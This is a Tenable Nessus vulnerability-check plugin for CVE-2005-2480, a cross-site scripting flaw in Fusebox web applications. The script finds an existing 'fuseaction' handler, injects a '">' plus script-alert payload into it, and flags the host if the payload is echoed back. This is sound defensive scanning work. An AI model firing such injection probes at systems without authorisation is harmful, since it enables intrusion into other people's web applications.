#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19383);
  script_version("$Revision: 1.14 $");
  script_cve_id("CVE-2005-2480");
  script_bugtraq_id(14460);
  script_xref(name:"OSVDB", value:"18520");

  script_name(english:"Fusebox index.cfm fuseaction Parameter XSS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is vulnerable to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Fusebox, a framework for building web-based
applications in Cold Fusion and PHP. 

The installed web application appears to have been created using
Fusebox in such a way that it fails to sanitize user-supplied input to
the 'fuseaction' parameter before using it in dynamically generated
webpages. 

Note that this flaw may not be specific to the Fusebox framework per
se but instead be an implementation issue since Fusebox itself does
not generate any HTML but lets the developer control all output." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-08/0043.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-08/0135.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  script_summary(english:"Checks for fuseaction parameter cross-site scripting vulnerability in Fusebox");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Request the initial page.
  res = http_get_cache(item:string(dir, "/"), port:port);
  if (res == NULL) exit(0);

  # Find an existing request handler.
  pat = 'a href=".+(\\?fuseaction=|/fuseaction/)([^"]+)';
  matches = egrep(string:res, pattern:pat);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      handler = eregmatch(string:match, pattern:pat);
      if (!isnull(handler)) {
        handler = handler[2];
        break;
      }
    }
  }

  # Try to exploit the flaw.
  if (handler) {
    w = http_send_recv3(method:"GET",
      item:string(
        dir, "/?",
        "fuseaction=", handler, urlencode(str:string('">', xss))
      ), 
      port:port
    );
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
